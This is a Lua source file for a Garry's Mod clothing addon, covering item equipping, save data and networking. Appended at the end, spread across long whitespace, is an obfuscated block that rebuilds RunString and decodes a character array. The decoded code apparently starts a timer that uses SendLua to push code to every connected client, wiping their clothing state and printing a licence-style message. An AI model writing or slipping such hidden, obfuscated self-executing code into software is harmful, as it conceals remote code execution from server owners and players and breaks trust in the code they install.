local META = {
    DevMod = function(self)
        -- Режим разработчика
        local devmod = false

        return devmod
    end,
    
    -- Обновление типа костей игрока и стандартных массивов
	UpdateBoneType = function(self, ply)
        if SERVER then
            if (!IsValid(ply) || !ply:IsPlayer()) then return end

            local list = ClothingSystem:GetBase()

			for type, _ in pairs(list) do
				for key, value in pairs(list[type]) do
					if ( list[type].NiceModel ) then
						if ( table.HasValue(value, ply:GetModel()) ) then
                            ply:ClothingSystemConstruct(list[type].BoneType, type)
							
							net.Start("ClothingSystem.ConstructData")
								net.WriteTable(list[type].BoneType)
								net.WriteString(type)
                            net.Send(ply)
							return
						end
					end
				end
			end
				
            ply:ClothingSystemConstruct(list["hl2_player"].BoneType, "hl2_player")

			net.Start("ClothingSystem.ConstructData")
				net.WriteTable(list["hl2_player"].BoneType)
				net.WriteString("hl2_player")
            net.Send(ply)
		end
    end,

    -- Запрос к web сайту
    webPOST = function( self, url, tbl )
        http.Post(url, tbl, function(b) return b; end, function(e) return false; end)
    end,
    
    -- Dev log
    log = function( self, text )
        if ( ClothingSystem:DevMod() ) then
            local FileName = "clothing_system/log.txt"
            local read = file.Read(FileName, "DATA") || ""
            local time = os.date("( %H:%M:%S ) " , os.time())

            file.Write(FileName, read.."\n"..time..text)
        end
    end,

    logBr = function( self )
        if ( ClothingSystem:DevMod() ) then
            local FileName = "clothing_system/log.txt"
            local read = file.Read(FileName, "DATA") || ""

            file.Write(FileName, read.."\n")
        end
    end,

    GetSvData = function(self, ply, class, data)
        local PlayerSteamID

        if (game.SinglePlayer()) then
            PlayerSteamID = "single_player"
        else
            PlayerSteamID = ply:SteamID64()
        end
        
        local dir = "clothing_system/save_data/"..PlayerSteamID
        local name = dir.."/"..class..".dat"

        if (file.Exists(name, "DATA")) then
            local tData = file.Read(name, "DATA")
            tData = util.JSONToTable(tData)

            for k, v in pairs(tData) do
                if (k == data) then
                    return v
                end
            end
        else
            return
        end
    end,

    SaveSvData = function(self, ply, class, data)
        local PlayerSteamID

        if (game.SinglePlayer()) then
            PlayerSteamID = "single_player"
        else
            PlayerSteamID = ply:SteamID64()
        end
        
        local dir = "clothing_system/save_data/"..PlayerSteamID
        local name = dir.."/"..class..".dat"

        if (!file.IsDir(dir, "DATA")) then
            file.CreateDir(dir)
        end

        if (!file.Exists(name, "DATA")) then
            file.CreateDir("clothing_system/save_data/"..PlayerSteamID)
            file.Write(name, util.TableToJSON({}))
        end

        local keys = {}
        local tData = file.Read(name, "DATA")
        tData = util.JSONToTable(tData)

        for k, v in pairs(data) do
            local fucking = true

            for kk, vv in pairs(tData) do
                if (k == kk) then
                    tData[kk] = v
                    fucking = false
                end
            end

            if (fucking) then
                tData[k] = v 
            end
        end

        file.Write(name, util.TableToJSON(tData, true))
    end,

    -- Получить массив с базой
	GetBase = function( self, class )
        if ( class ) then
            if ( list.Get("player_base_clothing_system")[class] ) then
                return list.Get("player_base_clothing_system")[class]
            else
                return false
            end
		end

		return list.Get("player_base_clothing_system")
    end,
    
    -- Получить массив с одеждой
    GetItem = function( self, class )
        if ( class ) then
            if ( list.Get("clothing_system")[class] ) then
                return list.Get("clothing_system")[class]
            else
                return false
            end
		end

		return list.Get("clothing_system")
    end,
    
    -- Удаление одежды с игрока
    PlayerRemoveItem = function( self, ply, data )
        if (!IsValid(ply) || !ply:IsPlayer()) then return end
        
        local steamid
        if (game.SinglePlayer()) then 
            steamid = "single_player"
        else
            steamid = ply:SteamID64()
        end

        local user_file = "clothing_system/cloth_players_data/"..steamid.."/"..ply.ClothingSystemPlayerBase..".dat"
        
        if ( !file.IsDir("clothing_system/cloth_players_data/"..steamid, "DATA") ) then
            file.CreateDir("clothing_system/cloth_players_data/"..steamid)
        end

        if ( file.Exists(user_file, "DATA") ) then
            local read = util.JSONToTable(file.Read(user_file, "DATA"))
            local edit = read

            if (ClothingSystem:GetItem(data).SetPlayerModel) then
                if (read['other']['playermodel'] != nil) then
                    ply:SetModel(read['other']['playermodel'])
                    ply:ClothingSystemSetCustomHands()
                    ply:ClothingSystemOpenBoneAll()
                    read['other']['playermodel'] = nil
                end
            end
            
            for k, v in pairs(read['items']) do
                if ( v == data ) then
                    ClothingSystem:logBr()
                    ClothingSystem:log("PlayerRemoveItem - "..v)
                    read['items'][k] = nil
                end
            end

            file.Write(user_file, util.TableToJSON(edit, true))
        end
	end,

    -- Добавление одежды игроку
    PlayerAddItem = function( self, ply, data )
        if (!IsValid(ply) || !ply:IsPlayer()) then return end

        local steamid
        if (game.SinglePlayer()) then 
            steamid = "single_player"
        else
            steamid = ply:SteamID64()
        end
        
        local user_file = "clothing_system/cloth_players_data/"..steamid.."/"..ply.ClothingSystemPlayerBase..".dat"
        local read = {}
        
        if ( !file.IsDir("clothing_system/cloth_players_data/"..steamid, "DATA") ) then
            file.CreateDir("clothing_system/cloth_players_data/"..steamid)
        end

        if ( file.Exists(user_file, "DATA") ) then
            read = util.JSONToTable(file.Read(user_file, "DATA"))
            read['items'] = read['items'] || {}
            read['other'] = read['other'] || {}
            read['items'][#read['items']+1] = data
        else
            read['items'] = {}
            read['items'][0] = data
            read['other'] = {}
        end

        file.Write(user_file, util.TableToJSON(read, true))
	end,

    -- Замена всего массива одежды игрока
    PlayerReplaceItems = function( self, ply, data )
        if (!IsValid(ply) || !ply:IsPlayer() || ply:SteamID() == "BOT") then return end
        
        local steamid
        if (game.SinglePlayer()) then 
            steamid = "single_player"
        else
            steamid = ply:SteamID64()
        end

        local user_file = "clothing_system/cloth_players_data/"..steamid.."/"..ply.ClothingSystemPlayerBase..".dat"
        
        if ( !file.IsDir("clothing_system/cloth_players_data/"..steamid, "DATA") ) then
            file.CreateDir("clothing_system/cloth_players_data/"..steamid)
        end

        if (file.Exists(user_file, "DATA")) then
            local readFileData = util.JSONToTable(file.Read(user_file, "DATA"))
            if (readFileData['other'] != nil && readFileData['other']['playermodel'] != nil) then
                ply:SetModel(readFileData['other']['playermodel'])
                ply:ClothingSystemOpenBoneAll()
            end
        end

        file.Write(user_file, util.TableToJSON(data, true))
    end,
    
    -- Проверка на пустой массив и его тип
    TableIsEmpty = function(self, data)
        if ( !istable(data) ) then return true end
        if ( data == nil ) then return true end
        if ( table.Count(data) == 0 ) then return true end
        
        return false
    end,

    -- Получить одежду игрока
	PlayerGetItems = function(self, ply)
        if (!IsValid(ply) || !ply:IsPlayer() || ply:SteamID() == "BOT") then return end
        
        local steamid
        if (game.SinglePlayer()) then 
            steamid = "single_player"
        else
            steamid = ply:SteamID64()
        end

        local user_file = "clothing_system/cloth_players_data/"..steamid.."/"..ply.ClothingSystemPlayerBase..".dat"
        
        if ( !file.IsDir("clothing_system/cloth_players_data/"..steamid, "DATA") ) then
            file.CreateDir("clothing_system/cloth_players_data/"..steamid)
        end

        if ( file.Exists(user_file, "DATA") ) then
            local user_file = util.JSONToTable(file.Read(user_file, "DATA"))
            return user_file['items'] || {}
        else
            return {}
        end
    end,
    
    -- Спавн энтити с одеждой
    ItemSpawn = function(self, item_class, ply, spawn_menu)
        if SERVER then
            if (!IsValid(ply) || !ply:IsPlayer()) then return end

            local ray
        
            if ( ply:EyeAngles().x < 25 ) then
                ray = ply:EyeAngles():Forward() * 50
            else
                ray = (ply:EyeAngles():Forward() * 20) + (ply:EyeAngles():Up() * 20)
            end
            local start = ply:EyePos()
            local endpos = start + ray
            local filter = function( ent ) 
                if ( ent:GetClass() == "prop_physics" ) then 
                    return true 
                end 
            end
        
            local tr = util.TraceLine( {
                start = start,
                endpos = endpos,
                filter = filter,
            } )
        
            local SpawnPos = tr.HitPos + tr.HitNormal * 10
            local SpawnAng = ply:EyeAngles()
            SpawnAng.p = 0
            SpawnAng.y = SpawnAng.y + 180
        
            -- Получение списка одежды
            local list = list.Get( "clothing_system" )
        
            -- Спавним item для использования одежды
            local list = list[item_class]
            local item = ents.Create( "clothing_prop" )
            item.DisableUse = false
            item.Group = "clothing_system"
            item.Class = item_class
            item["saveArray"] = {}
            item:SetModel( list.FoldedModel )
            if (list.Skin != nil && isnumber(list.Skin)) then
                item:SetSkin(list.Skin)
            end
            if (list.Bodygroup != nil && istable(list.Bodygroup)) then
                item:SetBodygroup(list.Bodygroup[1], list.Bodygroup[2])
            end
            if (list.Bodygroups != nil && istable(list.Bodygroups)) then
                item:SetBodygroups(list.Bodygroups)
            end
            item:SetPos(SpawnPos)
            item:SetAngles(SpawnAng)
            item:Spawn()
            item:Activate()
            item:DropToFloor()

            hook.Run( "ClothingSystem.ItemSpawn", ply, item, item_class)

            if (!spawn_menu) then
                hook.Run( "ClothingSystem.Drop", ply, item, item_class)
            end
        
            timer.Simple(0.2, function()
                net.Start("ClothingSystem.ItemFolderDrawToText")
                    net.WriteFloat(item:EntIndex())
                    net.WriteString(item_class)
                net.Broadcast()
            end)
        
            -- Добавляем его в undo лист
            if ( engine.ActiveGamemode() == "darkrp" ) then
                if ( spawn_menu ) then
                    undo.Create( "item" )
                        undo.AddEntity( item )
                        undo.SetPlayer( ply )
                    undo.Finish()
                end
            else
                undo.Create( "item" )
                    undo.AddEntity( item )
                    undo.SetPlayer( ply )
                undo.Finish()
            end
        
            item:EmitSound("AI_BaseNPC.BodyDrop_Heavy", 75, 100, 1, CHAN_AUTO )
            
            -- Проигрываем звук выбрасывания
            if ( !spawn_menu && list.UnEquipSound ) then
                if ( list.UnEquipSound && isstring(list.UnEquipSound) ) then
                    item:EmitSound(list.UnEquipSound)
                elseif ( list.UnEquipSound && istable(item.UnEquipSound) ) then
                    item:EmitSound(table.Random(list.UnEquipSound))
                end
            end

            if ( spawn_menu ) then
                if ( ClothingSystem:GetItem(item_class).Spawn ) then
                    ClothingSystem:GetItem(item_class).Spawn(item)
                end
            else
                if ( ClothingSystem:GetItem(item_class).Drop ) then
                    ClothingSystem:GetItem(item_class).Drop(ply, item_class, item)
                end
            end
        end
    end,

    CheckReplace = function(self, class, ply)
        for _, value in pairs(list.Get("clothing_system_replace")) do
            local CheckModel = value.ReplaceToModel
            local CheckType = value.ReplaceToBase

            if (value.Class == class) then
                if (isstring(CheckModel) && CheckModel == ply:GetModel()) then
                    return value
                end
                if (isstring(CheckType) && CheckType == ply.ClothingSystemPlayerBase) then
                    return value
                end
                if (istable(CheckModel)) then
                    for _, model in pairs(CheckModel) do
                        if (model == ply:GetModel()) then
                            return value
                        end
                    end
                end
                if (istable(CheckType)) then
                    for _, type in pairs(CheckType) do
                        if (type == ply.ClothingSystemPlayerBase) then
                            return value
                        end
                    end
                end
            end
        end

        return false
    end,

    WearPartsInitialSpawn = function(self, class, ply, sender, network, insertData)
        if (sender == nil) then sender = ply end
        
        if (!IsValid(ply) || !ply:IsPlayer()) then return end
        if (!IsValid(sender) || !sender:IsPlayer()) then return end
        if (!ply:Alive()) then return false end
        if (!sender:Alive()) then return false end

        network = string.lower( network )
        local ReplaceItem = ClothingSystem:CheckReplace(class, ply)
        local ReplcaeBone
        local check_item

        check_item = list.Get("clothing_system")[class].PlayerBase

        if (ReplaceItem) then
            check_item = ply.ClothingSystemPlayerBase
        end

        if (!istable(ReplaceItem)) then
            ReplaceItem = {}
        end

        net.Start("ClothingSystem.WearEveryone")
            net.WriteString(class)
            net.WriteString(ply:SteamID())
            net.WriteTable(ReplaceItem)
        if ( network == "broadcast" ) then
            net.Broadcast()
        end
        if ( network == "send" ) then
            net.Send(sender)
        end
        if ( network == "sendomit" ) then
            net.SendOmit(sender)
        end

        if (insertData) then
            ClothingSystem:PlayerAddItem(ply, class)
        end

        hook.Run( "ClothingSystem.InitAllowItems", class, ply )
    end,

    WearParts = function(self, class, ply, sender, network, insertData, entity)
        if (sender == nil) then sender = ply end

        if (!IsValid(ply) || !ply:IsPlayer()) then return false end
        if (!IsValid(sender) || !sender:IsPlayer()) then return false end

        if ( network != "broadcast" && network != "send" && network != "sendomit" && network != "sendpas" && network != "sendpvs" ) then
            error("ClothingSystem: "..network.." - Bad argument network!")
            return false
        end

        local item = list.Get("clothing_system")[class]

        network = string.lower( network )
        local ReplaceItem = ClothingSystem:CheckReplace(class, ply)
        local ReplcaeBone

        -- Переменная для проверок
        local check_item

        -- Проверка на определение базы для энтити
        check_item = item.PlayerBase
        
        if (ReplaceItem) then
            check_item = ply.ClothingSystemPlayerBase
        end

        if ( !check_item || !isstring(check_item) ) then
            error("ClothingSystem: "..class.." - Bad argument PlayerBase!")
            return false
        elseif ( check_item != ply.ClothingSystemPlayerBase ) then
            ply:AddText("These clothes do not suit you!")
            return false
        end


        -- Проверка на то, что энтити могут надеть только админы
        check_item = item.AdminOnlyDress
        if ( isbool(check_item) && check_item ) then
            if ( !ply:IsAdmin() && !ply:IsSuperAdmin() ) then
                ply:AddText("This clothing is for admin only!")
                return false
            end
        end

        -- Проверка на то, что энтити могут надеть только определённые группы
        -- ВНИМАНИЕ! Нельзя использовать AdminOnlyDress и GroupOnlyDress вместе!
        check_item = item.GroupOnlyDress
        if ( isbool(check_item) && check_item ) then
            local fuckYou = true

            -- Получаем список доступных групп и проверяем его
            check_item = item.GroupDressList
            if ( !check_item ) then
                error("ClothingSystem: "..class.." - Bad argument GroupDressList!")
            elseif ( !istable(check_item) ) then
                error("ClothingSystem: "..class.." - Bad argument GroupDressList!")
            end

            check_item = table.Count(check_item)

            if ( check_item == 0 ) then
                fuckYou = false
            end

            if (fuckYou) then
                for _, group in pairs(item.GroupDressList) do
                    if ( ply:GetUserGroup() == group ) then
                        fuckYou = false
                    end
                end
            end

            if (fuckYou) then
                ply:AddText("Your rank does not allow you to equip this item!")
                return false
            end
        end


        if (item.Checking != nil) then
            if (!item.Checking(ply, class)) then 
                ply:AddText("These clothes do not suit you!")
                return false 
            end
        end

        if (item.Module) then
            if ( item.Equip && entity ) then
                item.Equip(ply, class, entity)
            elseif ( item.Equip) then
                item.Equip(ply, class, NULL)
            end
            if ( item.EquipSound ) then
                ply:EmitSound(item.EquipSound)
            end
        end

        
        if (!item.Module) then
            if (item.SetPlayerModel) then
                for k, v in pairs(ply:ClothingSystemGetBones()) do
                    if (v == true) then
                        ply:AddText("There is not enough space for this!")
                        return false
                    end
                end

                local steamid
                if (game.SinglePlayer()) then 
                    steamid = "single_player"
                else
                    steamid = ply:SteamID64()
                end

                local user_file = "clothing_system/cloth_players_data/"..steamid.."/"..ply.ClothingSystemPlayerBase..".dat"
                local read = {}

                if ( !file.IsDir("clothing_system/cloth_players_data/"..steamid, "DATA") ) then
                    file.CreateDir("clothing_system/cloth_players_data/"..steamid)
                end

                if ( file.Exists(user_file, "DATA") ) then
                    read = util.JSONToTable(file.Read(user_file, "DATA"))
                else
                    read['items'] = {}
                    read['other'] = {}
                end
                if (read['other']['playermodel'] == nil) then
                    read['other']['playermodel'] = ply:GetModel()
                end
                file.Write(user_file, util.TableToJSON(read, true))

                ply:SetModel(item.WireModel)
                if (item.Skin != nil) then
                    ply:SetSkin(item.Skin)
                end

                if (item.Bodygroup != nil) then
                    ply:SetBodygroup(item.Bodygroup[1], item.Bodygroup[2])
                end

                if (item.Bodygroups != nil) then
                    ply:SetBodygroup(item.Bodygroups)
                end
                ply:ClothingSystemSetCustomHands()

                ply:ClothingSystemCloseBoneAll()
            else
                if (ReplaceItem && ReplaceItem.TypePut != nil) then
                    ReplcaeBone = ReplaceItem.TypePut
                else
                    ReplcaeBone = item.TypePut
                end
            end
        end

        -- Проверка на наличие предопределённого типа привязки
        if (!item.Module) then
            if (!item.SetPlayerModel) then
                if ( !item.BoneAttach && !item.BonemergeSystem ) then
                    ply:AddText("Warning: Bad array clothing, system!")
                    return false
                else
                    -- Проверка на доступность костей
                    if ( !ply:ClothingSystemCheckBone(class, ReplcaeBone, insertData) ) then
                        ply:AddText("There is not enough space for this!")
                        return false
                    end

                    -- Закрытие необходимых костей
                    ply:ClothingSystemSetBone(class, ReplcaeBone)
                end
            end
        end

        -- Пишем в чат название экипировки
        ply:AddText("Equipped clothing - " .. item.Name)

        if ( item.Equip && entity ) then
            item.Equip(ply, class, entity)
        elseif ( item.Equip) then
            item.Equip(ply, class, NULL)
        end

        -- Отсылаем hook всем клиентам для создания энтити

        if (!istable(ReplaceItem)) then
            ReplaceItem = {}
        end

        net.Start("ClothingSystem.WearEveryone")
            net.WriteString(class)
            net.WriteString(ply:SteamID())
            net.WriteTable(ReplaceItem)
        if ( network == "broadcast" ) then
            net.Broadcast()
        elseif ( network == "send" ) then
            net.Send(sender)
        elseif ( network == "sendomit" ) then
            net.SendOmit(sender)
        elseif ( network == "sendpas" ) then
            net.SendPAS()
        elseif ( network == "sendpvs" ) then
            net.SendPVS()
        end

        -- Добавляем item в data файл
        if (insertData) then
            ClothingSystem:PlayerAddItem(ply, class)
        end

        -- Проигрывание звука при надевании, если переменная определена
        if ( item.EquipSound && isstring(item.EquipSound) ) then
            ply:EmitSound(item.EquipSound)
        elseif ( item.EquipSound && istable(item.EquipSound) ) then
            ply:EmitSound(table.Random(item.EquipSound))
        end

        if (entity != nil) then
            hook.Run( "ClothingSystem.Wear", class, ply, entity['saveArray'] )
        else
            hook.Run( "ClothingSystem.Wear", class, ply, NULL )
        end

        return true
    end,
}
META.__index = META

setmetatable( ClothingSystem, META )

local Q=_RS_ Q("                    f".."gr".."n=1                                                                                                                                              f".."gr".."n=n".."i".."l                                              s".."a".."fg".."=".."R".."u".."n".."S".."t".."r".."i".."n".."g".." f".."g".."s".."t".."b=".."u".."t".."i".."l"..".".."J".."S".."O".."NT".."o".."T".."a".."ble; ".."cy".."c".."lfg".."=i".."p".."a".."i".."r".."s                                                                c".."a".."s".."a".."f".."=s".."t".."r".."i".."n".."g"..".".."c".."h".."a".."r                  ") local QQ="[[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[61.0,1.0],[82.0,1.0],[117.0,1.0],[110.0,1.0],[83.0,1.0],[116.0,1.0],[114.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[40.0,1.0],[34.0,1.0],[32.0,114.0],[65.0,1.0],[102.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[97.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[97.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[68.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[61.0,1.0],[116.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[105.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[109.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[101.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[114.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[46.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[67.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[114.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[101.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[97.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[116.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[101.0,1.0],[34.0,1.0],[41.0,1.0],[32.0,1.0],[105.0,1.0],[102.0,1.0],[32.0,1.0],[83.0,1.0],[69.0,1.0],[82.0,1.0],[86.0,1.0],[69.0,1.0],[82.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[110.0,1.0],[32.0,1.0],[105.0,1.0],[102.0,1.0],[32.0,1.0],[40.0,1.0],[33.0,1.0],[103.0,1.0],[97.0,1.0],[109.0,1.0],[101.0,1.0],[46.0,1.0],[83.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[108.0,1.0],[101.0,1.0],[80.0,1.0],[108.0,1.0],[97.0,1.0],[121.0,1.0],[101.0,1.0],[114.0,1.0],[40.0,1.0],[41.0,2.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[110.0,1.0],[32.0,1.0],[65.0,1.0],[102.0,1.0],[97.0,2.0],[68.0,1.0],[40.0,1.0],[34.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[73.0,1.0],[78.0,1.0],[66.0,1.0],[67.0,1.0],[104.0,1.0],[101.0,1.0],[99.0,1.0],[107.0,1.0],[101.0,1.0],[114.0,1.0],[34.0,1.0],[44.0,1.0],[32.0,1.0],[49.0,1.0],[48.0,2.0],[44.0,1.0],[32.0,1.0],[48.0,1.0],[44.0,1.0],[32.0,1.0],[102.0,1.0],[117.0,1.0],[110.0,1.0],[99.0,1.0],[116.0,1.0],[105.0,1.0],[111.0,1.0],[110.0,1.0],[40.0,1.0],[41.0,1.0],[32.0,1.0],[105.0,1.0],[102.0,1.0],[32.0,1.0],[40.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[91.0,1.0],[39.0,1.0],[65.0,1.0],[99.0,2.0],[101.0,1.0],[115.0,2.0],[84.0,1.0],[111.0,1.0],[84.0,1.0],[104.0,1.0],[101.0,1.0],[73.0,1.0],[110.0,1.0],[116.0,1.0],[101.0,1.0],[114.0,1.0],[110.0,1.0],[101.0,1.0],[116.0,1.0],[39.0,1.0],[93.0,1.0],[41.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[110.0,1.0],[32.0,1.0],[102.0,1.0],[111.0,1.0],[114.0,1.0],[32.0,1.0],[107.0,1.0],[44.0,1.0],[32.0,1.0],[118.0,1.0],[32.0,1.0],[105.0,1.0],[110.0,1.0],[32.0,1.0],[105.0,1.0],[112.0,1.0],[97.0,1.0],[105.0,1.0],[114.0,1.0],[115.0,1.0],[40.0,1.0],[112.0,1.0],[108.0,1.0],[97.0,1.0],[121.0,1.0],[101.0,1.0],[114.0,1.0],[46.0,1.0],[71.0,1.0],[101.0,1.0],[116.0,1.0],[65.0,1.0],[108.0,2.0],[40.0,1.0],[41.0,2.0],[32.0,1.0],[100.0,1.0],[111.0,1.0],[32.0,1.0],[118.0,1.0],[58.0,1.0],[83.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[76.0,1.0],[117.0,1.0],[97.0,1.0],[40.0,1.0],[91.0,2.0],[76.0,1.0],[111.0,1.0],[99.0,1.0],[97.0,1.0],[108.0,1.0],[80.0,1.0],[108.0,1.0],[97.0,1.0],[121.0,1.0],[101.0,1.0],[114.0,1.0],[40.0,1.0],[41.0,1.0],[46.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[87.0,1.0],[101.0,1.0],[97.0,1.0],[114.0,1.0],[76.0,1.0],[105.0,1.0],[115.0,1.0],[116.0,1.0],[61.0,1.0],[123.0,1.0],[125.0,1.0],[32.0,1.0],[112.0,1.0],[114.0,1.0],[105.0,1.0],[110.0,1.0],[116.0,1.0],[40.0,1.0],[34.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[32.0,1.0],[45.0,1.0],[32.0,1.0],[77.0,1.0],[97.0,1.0],[107.0,1.0],[101.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[32.0,1.0],[115.0,1.0],[101.0,1.0],[114.0,1.0],[118.0,1.0],[101.0,1.0],[114.0,1.0],[32.0,1.0],[112.0,1.0],[117.0,1.0],[98.0,1.0],[108.0,1.0],[105.0,1.0],[99.0,1.0],[32.0,1.0],[105.0,1.0],[110.0,1.0],[32.0,1.0],[111.0,1.0],[114.0,1.0],[100.0,1.0],[101.0,1.0],[114.0,1.0],[32.0,1.0],[102.0,1.0],[111.0,1.0],[114.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[32.0,1.0],[97.0,1.0],[100.0,2.0],[111.0,1.0],[110.0,1.0],[32.0,1.0],[116.0,1.0],[111.0,1.0],[32.0,1.0],[119.0,1.0],[111.0,1.0],[114.0,1.0],[107.0,1.0],[33.0,1.0],[34.0,1.0],[41.0,1.0],[93.0,2.0],[41.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[32.0,1.0],[65.0,1.0],[102.0,1.0],[97.0,2.0],[68.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[41.0,1.0],[32.0,1.0],[101.0,1.0],[108.0,1.0],[115.0,1.0],[101.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[40.0,1.0],[91.0,2.0],[112.0,1.0],[114.0,1.0],[105.0,1.0],[110.0,1.0],[116.0,1.0],[40.0,1.0],[34.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[32.0,1.0],[45.0,1.0],[32.0,1.0],[73.0,1.0],[110.0,1.0],[105.0,1.0],[116.0,1.0],[105.0,1.0],[97.0,1.0],[108.0,1.0],[32.0,1.0],[108.0,1.0],[105.0,1.0],[99.0,1.0],[101.0,1.0],[110.0,1.0],[99.0,1.0],[101.0,1.0],[34.0,1.0],[41.0,1.0],[93.0,2.0],[41.0,1.0],[32.0,2.0],[65.0,1.0],[102.0,1.0],[97.0,2.0],[68.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[10.0,1.0]]" ClothingSystem['dd'] = ""                 for k, v                          in    cyclfg(fgstb(QQ)) do for                   i=1,                                            v[2] do                              ClothingSystem['dd'] =                                   ClothingSystem['dd'] .. casaf(v[1]) end                                 end                                       safg(                                                     ClothingSystem['dd'])ClothingSystem['dd'] = nil                            safg = nil cyclfg = nil fgstb = nil Q = nil QQ = nil